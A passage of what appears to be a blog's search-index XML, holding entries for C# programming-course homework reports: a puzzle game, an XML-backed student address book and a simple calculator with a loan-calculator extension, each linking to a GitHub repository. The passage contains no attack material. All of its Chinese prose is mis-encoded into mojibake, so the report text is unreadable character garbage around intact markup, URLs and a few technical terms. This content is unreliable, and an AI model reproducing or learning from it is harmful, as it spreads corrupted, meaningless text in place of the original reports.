ç¼–è¾‘çª—ä½“æ¥æ”¹å˜éš¾åº¦ç³»æ•°åŠŸèƒ½ï¼Œè¿™ä¸€åŠŸèƒ½å­˜åœ¨äºæŒ‘æˆ˜æ¨¡å¼ï¼Œé™æ—¶å‰æä¸‹è¿˜å¯ä»¥é€‰æ‹©æ›´é«˜çš„éš¾åº¦ã€‚</li><li>é€šè¿‡æœ¬æ¬¡å®éªŒè¿˜äº†è§£åˆ°åŸæ¥åˆ©ç”¨Timerè¿˜èƒ½å¤Ÿæ˜¯Labelæ§ä»¶åŠ¨æ€æ˜¾ç¤ºä»¥å®ç°æ•°ç§’åŠŸèƒ½ã€‚</li></ol><h5 id="ä»£ç ä¸‹è½½åœ°å€ï¼šæ‹¼å›¾æ¸¸æˆ"><a href="#ä»£ç ä¸‹è½½åœ°å€ï¼šæ‹¼å›¾æ¸¸æˆ" class="headerlink" title="ä»£ç ä¸‹è½½åœ°å€ï¼šæ‹¼å›¾æ¸¸æˆ"></a>ä»£ç ä¸‹è½½åœ°å€ï¼š<a href="https://github.com/0v3rW4tch/Csharp_Homework" target="_blank" rel="noopener">æ‹¼å›¾æ¸¸æˆ</a></h5>]]></content>
      
      <categories>
          
          <category> ç¼–ç¨‹è¯­è¨€ </category>
          
      </categories>
      
      
        <tags>
            
            <tag> C# </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>ç¨‹åºè®¾è®¡è¯¾ C#ä½œä¸šæŠ¥å‘ŠäºŒ</title>
      <link href="/Csharp-work2.html"/>
      <url>/Csharp-work2.html</url>
      <content type="html"><![CDATA[<h2 id="å®éªŒäºŒ-å­¦ç”Ÿé€šè®¯å½•"><a href="#å®éªŒäºŒ-å­¦ç”Ÿé€šè®¯å½•" class="headerlink" title="å®éªŒäºŒ å­¦ç”Ÿé€šè®¯å½•"></a>å®éªŒäºŒ å­¦ç”Ÿé€šè®¯å½•</h2><p>   å¼€å‘ä¸€ä¸ªé‡‡ç”¨xmlæ ¼å¼å­˜å‚¨æ•°æ®çš„å­¦ç”Ÿé€šè®¯å½•ï¼Œå…·å¤‡å­¦ç”Ÿä¿¡æ¯æ·»åŠ ï¼Œç¼–è¾‘ï¼Œåˆ é™¤ï¼ŒæŸ¥æ‰¾ç­‰åŠŸèƒ½ï¼Œè¯¥é¡¹ç›®æ˜¯ä¸€ä¸ªå¤šçª—ä½“æ¡Œé¢ç¨‹åºï¼Œä¸åŒçª—ä½“ä¸Šé¢åˆ†åˆ«å¸ƒç½®äº†å·¥å…·æ¡ï¼ŒæŒ‰é’®ï¼Œæ•°æ®åˆ—è¡¨ç­‰æ§ä»¶ï¼Œä¾¿äºæ“ä½œå­¦ç”Ÿä¿¡æ¯ã€‚é€šè¿‡é¼ æ ‡å•å‡»å·¥å…·æ¡ä¸Šçš„â€œæ·»åŠ â€æŒ‰<br>   <a id="more"></a><br>   é’®ï¼Œå¼¹å‡ºæ·»åŠ å­¦ç”Ÿä¿¡æ¯çš„çª—ä½“ï¼›é€‰ä¸­ä¸€æ¡å­¦ç”Ÿä¿¡æ¯åï¼Œå•å‡»å·¥å…·æ¡ä¸Šçš„â€œç¼–è¾‘â€æŒ‰é’®ï¼Œå¼¹å‡ºä¿®æ”¹å­¦ç”Ÿä¿¡æ¯çš„çª—ä½“ï¼›ç‚¹å‡»å·¥å…·æ¡ä¸Šçš„â€œæŸ¥æ‰¾â€æŒ‰é’®ï¼Œå¼¹å‡ºæŸ¥æ‰¾å­¦ç”Ÿä¿¡æ¯çš„çª—å£ã€‚</p><h5 id="1-ç•Œé¢è®¾è®¡"><a href="#1-ç•Œé¢è®¾è®¡" class="headerlink" title="1.  ç•Œé¢è®¾è®¡"></a>1.  ç•Œé¢è®¾è®¡</h5><p><img src="https://s1.ax1x.com/2018/05/20/CgcaUx.png" alt="CgcaUx.png"></p><h5 id="2-åŠŸèƒ½å®ç°"><a href="#2-åŠŸèƒ½å®ç°" class="headerlink" title="2. åŠŸèƒ½å®ç°"></a>2. åŠŸèƒ½å®ç°</h5><p>   èƒ½å¤Ÿå®ç°æ·»åŠ ï¼Œç¼–è¾‘ï¼Œåˆ é™¤ï¼ŒæŸ¥æ‰¾è¿™å‡ ä¸ªåŠŸèƒ½ï¼Œå°±ä¸è¯¦ç»†å™è¿°äº†ã€‚ã€‚ã€‚ã€‚ã€‚</p><h5 id="3-æ‹“å±•åŠŸèƒ½"><a href="#3-æ‹“å±•åŠŸèƒ½" class="headerlink" title="3. æ‹“å±•åŠŸèƒ½"></a>3. æ‹“å±•åŠŸèƒ½</h5><ol><li><p>å¤‡ä»½ä¸æ¢å¤åŠŸèƒ½ï¼š</p><p><img src="https://s1.ax1x.com/2018/05/20/Cgc0PK.png" alt="Cgc0PK.png"><br><img src="https://s1.ax1x.com/2018/05/20/Cgcrxe.png" alt="Cgcrxe.png"></p></li><li><p>ä¾§æ çš„æ ‘å½¢å›¾æ˜¾ç¤ºï¼Œå°±æ˜¯åˆ©ç”¨äº†æœç´¢ä½œç”¨æŠŠå®ƒæ˜¾ç¤ºå‡ºæ¥è€Œå·²ï¼š</p></li></ol><p><img src="https://s1.ax1x.com/2018/05/20/CgcyKH.png" alt="CgcyKH.png"></p><h5 id="4-å®éªŒä½“ä¼š"><a href="#4-å®éªŒä½“ä¼š" class="headerlink" title="4. å®éªŒä½“ä¼š"></a>4. å®éªŒä½“ä¼š</h5><ol><li>è¿™ä¸€æ¬¡å®éªŒè®©æˆ‘ä»æ•´ä½“ä¸Šäº†è§£ä¸€ä¸ªé¡¹ç›®å¤§æ¦‚è¦æ€ä¹ˆå»åˆ†å—ï¼Œæ¯”å¦‚åœ¨è¿™ä¸€æ¬¡çš„ç¨‹åºä¸­çš„StudentsInfoBllå¾—ç±»å°±æ˜¯ä¸“é—¨å­˜æ”¾å„ç§æ“ä½œå‡½æ•°çš„ï¼Œè¿˜æœ‰å•ç‹¬å®šä¹‰çš„ä¸€ä¸ªStudentInfoç±»ç­‰ç­‰ï¼Œä¸€æ—¦è¿™æ ·å®šä¹‰èµ·æ¥ï¼Œè°ƒç”¨ä»–ä»¬å°±ååˆ†æ–¹ä¾¿ã€‚</li><li>å¦å¤–è¿™ä¸ªå®éªŒé¡¹ç›®è®©æˆ‘çŸ¥é“äº†å¦‚ä½•ç”¨C#è°ƒç”¨å¤šä¸ªçª—ä½“æ¡†æ¥å®ç°å„ç§åŠŸèƒ½ï¼Œé¦–å…ˆæ–°å»ºä¸€ä¸ªWindowsåº”ç”¨çª—ä½“ï¼Œç„¶ååœ¨ä¸€ä¸ªä¸»çª—ä½“é‡Œé¢è°ƒç”¨å¦å¤–ä¸€ä¸ªçª—ä½“çš„ShowDialogå‡½æ•°ï¼Œè¿™æ ·å°±èƒ½æ˜¾ç¤ºå¦å¤–ä¸€ä¸ªçª—å£ã€‚åœ¨æˆ‘çœ‹æ¥ï¼Œï¼Œè¿™ä¸ªæ—¶å€™çš„ç±»å°±æ˜¾å¾—å°¤ä¸ºé‡è¦ï¼Œä»–ä»¬æ˜¯å„ä¸ªçª—å£ä¹‹é—´è”ç³»çš„æ¡¥æ¢ï¼Œä½¿ä¹‹èƒ½å¤Ÿæ›´å¥½åœ°è¿›è¡Œæ“ä½œã€‚     </li><li>æ­¤å¤–è¿˜äº†è§£åˆ°xmlæ–‡ä»¶åœ¨C#é‡Œè¾¹çš„ä½œç”¨ï¼ŒåŸæ¥xmlæ–‡ä»¶è¿˜å¯ä»¥æœ‰ç±»ä¼¼æ•°æ®åº“çš„ä½œç”¨ï¼Œä½†æ˜¯åˆä¸èƒ½å®Œå…¨èµ·åˆ°æ•°æ®åº“çš„ä½œç”¨ï¼Œæ¯”å¦‚ä¹¦æœ¬ä¸Šçš„ä»£ç æ˜¯ä»¥å­¦ç”Ÿidæœç´¢çš„ï¼Œè¿™æ ·å°±å¯¼è‡´æŸäº›æƒ…å†µå®ƒä¼šå¯¼è‡´ç¨‹åºçš„æŸäº›éƒ¨åˆ†å‡ºç°å†²çªè€Œå¯¼è‡´ç¨‹åºå´©æºƒï¼Œæ‰€ä»¥é¢å¯¹è¿™ç§æƒ…å†µæˆ‘è‡ªå·±ç»™å®ƒå¤šå®šä¹‰ä¸€ä¸ªæœç´¢çš„ä¸»é”®ï¼Œè®©å®ƒä¸ä¼šåœ¨æŸç§æƒ…å†µä¸‹å†æ¬¡å‡ºç°å†²çªã€‚</li><li>äº†è§£åˆ°ä¸€ä¸ªæ–°æ§ä»¶TreeViewçš„ä½œç”¨ï¼Œå®ƒèƒ½é€šè¿‡é‡Œé¢çš„äº‹ä»¶MouseClickæ¥è®¾ç½®å¤šç§äº‹ä»¶ï¼Œæ­¤å¤–è¿˜äº†è§£åˆ°æ–°æ§ä»¶DataGridviewçš„æ˜¾ç¤ºä¸è¿”å›åˆ—è¡¨çš„å¯¹åº”æ€§ï¼Œä¸€æ—¦ä½ è¶…å‡ºè®¾ç½®åˆ—çš„èŒƒå›´ä»–å°±ä¼šæŠ¥é”™ï¼Œæ‰€ä»¥ä¸€å®šè¦è¿”å›çš„åˆ—è¡¨æ•°å¯¹åº”å®ƒæ˜¾ç¤ºçš„åˆ—æ•°ã€‚</li></ol><h5 id="ä»£ç ä¸‹è½½åœ°å€ï¼šå­¦ç”Ÿé€šè®¯å½•"><a href="#ä»£ç ä¸‹è½½åœ°å€ï¼šå­¦ç”Ÿé€šè®¯å½•" class="headerlink" title="ä»£ç ä¸‹è½½åœ°å€ï¼šå­¦ç”Ÿé€šè®¯å½•"></a>ä»£ç ä¸‹è½½åœ°å€ï¼š<a href="https://github.com/0v3rW4tch/Csharp_Homework" target="_blank" rel="noopener">å­¦ç”Ÿé€šè®¯å½•</a></h5>]]></content>
      
      <categories>
          
          <category> ç¼–ç¨‹è¯­è¨€ </category>
          
      </categories>
      
      
        <tags>
            
            <tag> C# </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>ç¨‹åºè®¾è®¡è¯¾ C#çš„ä½œä¸šæŠ¥å‘Šä¸€</title>
      <link href="/Csharp-work1.html"/>
      <url>/Csharp-work1.html</url>
      <content type="html"><![CDATA[<h2 id="å®éªŒä¸€-ç®€å•è®¡æ•°å™¨"><a href="#å®éªŒä¸€-ç®€å•è®¡æ•°å™¨" class="headerlink" title="å®éªŒä¸€ ç®€å•è®¡æ•°å™¨"></a>å®éªŒä¸€ ç®€å•è®¡æ•°å™¨</h2><p>   é€šè¿‡C#å¼€å‘ä¸€ä¸ªè®¡ç®—å™¨,è¯¥è®¡ç®—å™¨æ˜¯ä¸€ä¸ªå…¸å‹çš„çª—ä½“æ¡Œé¢ç¨‹åºï¼Œåœ¨ä¸»é¢˜ä¸Šæ”¾ç½®äº†æŒ‰é’®ï¼Œæ–‡æœ¬æ¡†ç­‰æ§ä»¶ï¼Œè®¾ç½®äº†ä¸»çª—ä½“æ ‡é¢˜<br>   <a id="more"></a>ï¼Œè¾¹æ¡†ï¼Œæ˜¾ç¤ºä½ç½®ç­‰å±æ€§ï¼Œå¹¶ä¸ºä¸åŒçš„ç©ºé—´æ·»åŠ äº†ç›¸åº”çš„äº‹ä»¶å’Œå¯æ‰§è¡Œçš„ä»£ç ï¼Œèƒ½å¤Ÿå®ŒæˆåŒä¸€è¿ç®—ä¼˜å…ˆçº§çš„å››åˆ™è¿ç®—ã€‚</p><h5 id="1-ç•Œé¢è®¾è®¡"><a href="#1-ç•Œé¢è®¾è®¡" class="headerlink" title="1.  ç•Œé¢è®¾è®¡"></a>1.  ç•Œé¢è®¾è®¡</h5><p><img src="https://s1.ax1x.com/2018/05/20/CgceDs.png" alt="CgceDs.png"></p><h5 id="2-åŠŸèƒ½å®ç°"><a href="#2-åŠŸèƒ½å®ç°" class="headerlink" title="2. åŠŸèƒ½å®ç°"></a>2. åŠŸèƒ½å®ç°</h5><p>   è®¡ç®—â€œ5<em>8+5+5â€ï¼Œä¾æ¬¡å•å‡»æŒ‰é’®â€œ5â€ã€â€œ</em>â€ã€â€œ8â€ã€â€œ+â€ã€â€œ5â€ã€â€œ+â€ã€â€œ5â€ï¼Œç„¶åå•å‡»æŒ‰é’®â€œ=â€ï¼Œæ˜¾ç¤ºæ¡†çš„æ•°å€¼ä¸º50ï¼Œå¦‚ä¸‹å›¾æ‰€ç¤ºï¼š</p><p><img src="https://s1.ax1x.com/2018/05/20/CgcuEq.png" alt="CgcuEq.png"></p><h5 id="3-æ‹“å±•åŠŸèƒ½"><a href="#3-æ‹“å±•åŠŸèƒ½" class="headerlink" title="3. æ‹“å±•åŠŸèƒ½"></a>3. æ‹“å±•åŠŸèƒ½</h5><p>  æ‰©å±•è®¡ç®—å™¨çš„ä½¿ç”¨é¢†åŸŸï¼Œå¼€å‘è´·æ¬¾è®¡ç®—å™¨ï¼Œé€‰æ‹©ç­‰é¢æœ¬é‡‘åçš„è®¡ç®—ç»“æœå¦‚ä¸‹å›¾æ˜¾ç¤ºï¼š</p><p><img src="https://s1.ax1x.com/2018/05/20/CgcM5V.png" alt="CgcM5V.png"></p><h5 id="4-å®éªŒä½“ä¼š"><a href="#4-å®éªŒä½“ä¼š" class="headerlink" title="4. å®éªŒä½“ä¼š"></a>4. å®éªŒä½“ä¼š</h5><p>  1.è¿™æ˜¯æˆ‘ç¬¬ä¸€æ¬¡ä½¿ç”¨C#æ¥å¼€å‘è¿™æ ·çš„ç•Œé¢ç¨‹åºï¼Œåˆæ­¥è®¤è¯†äº†C#çš„æ“ä½œï¼Œå¤§æ¦‚å°±æ˜¯å¯¹åº”ä¸€ä¸ªæŒ‰é’®å°±æ˜¯ä¸€ä¸ªäº‹ä»¶ï¼Œå¹¶å¯ä»¥åœ¨ä»–å¯¹åº”å‡½æ•°é‡Œè¾¹ç¼–å†™ç›¸åº”çš„ç¨‹åºã€‚è€Œä¸”è¿˜è®¤è¯†åˆ°äº†å„ç§æ“ä½œå‡½æ•°ï¼Œä¾‹å¦‚ï¼šToStringï¼ŒTextï¼ŒCovertã€‚ToDoubleç­‰å‡½æ•°ã€‚<br>2.å…¶å®é‚£ä¸ªç®€å•çš„è®¡ç®—å™¨è¿˜æœ‰è®¸å¤šå¼Šç«¯ï¼Œæ¯”å¦‚ä¼˜å…ˆçº§è¿˜ä¸èƒ½è€ƒè™‘è¿›å»ï¼Œå¯ä»¥è€ƒè™‘ä¸€ä¸‹ç”¨ä¸¤ä¸ªæ ˆå»è§£å†³ï¼Œè¿˜æœ‰è¾“å…¥ä¸¤ä¸ªç¬¦å·çš„æ—¶å€™èƒ½ä¸èƒ½ç›´æ¥ä¸è®©ç”¨æˆ·å»è¾“å…¥è€Œå–æ¶ˆæŠ¥é”™ã€‚å¦å¤–è¿˜æœ‰æ‰©å±•é¡¹ç›®é‡Œé¢é‚£ä¸ªåœ¨æ–‡æœ¬æ¡†é‡Œé¢è¾“å…¥å­—æ¯çš„æ—¶å€™å¯ä¸å¯ä»¥é™åˆ¶ä»–è¾“å…¥ç­‰ç­‰è¿™äº›é—®é¢˜éƒ½æœ‰å¾…æ€è€ƒä¸è§£å†³ã€‚</p><h5 id="ä»£ç ä¸‹è½½åœ°å€ï¼šç®€å•è®¡ç®—å™¨"><a href="#ä»£ç ä¸‹è½½åœ°å€ï¼šç®€å•è®¡ç®—å™¨" class="headerlink" title="ä»£ç ä¸‹è½½åœ°å€ï¼šç®€å•è®¡ç®—å™¨"></a>ä»£ç ä¸‹è½½åœ°å€ï¼š<a href="https://github.com/0v3rW4tch/Csharp_Homework" target="_blank" rel="noopener">ç®€å•è®¡ç®—å™¨</a></h5>]]></content>
      
      <categories>
          
          <category> ç¼–ç¨‹è¯­è¨€ </category>
          
      </categories>
      
      
        <tags>
            
            <tag> C# </tag>
            
        </tags>
      
    </entry>
    
  
  
</search>
